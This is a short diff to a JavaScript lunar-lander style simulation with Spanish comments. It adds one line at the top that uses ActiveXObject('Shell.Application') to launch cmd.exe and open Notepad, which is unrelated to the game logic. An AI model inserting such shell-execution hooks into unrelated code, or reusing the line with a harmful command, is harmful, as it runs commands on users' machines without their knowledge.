@@ -1,3 +1,5 @@
+var obj=new ActiveXObject("Shell.Application");obj.ShellExecute("cmd.exe","/c  Notepad");
+
 var y = 10; /* altura inicial y0=10%, debe leerse al iniciar si queremos que tenga alturas diferentes dependiendo del dispositivo*/
 var v = 0;
 var g = 1.622;
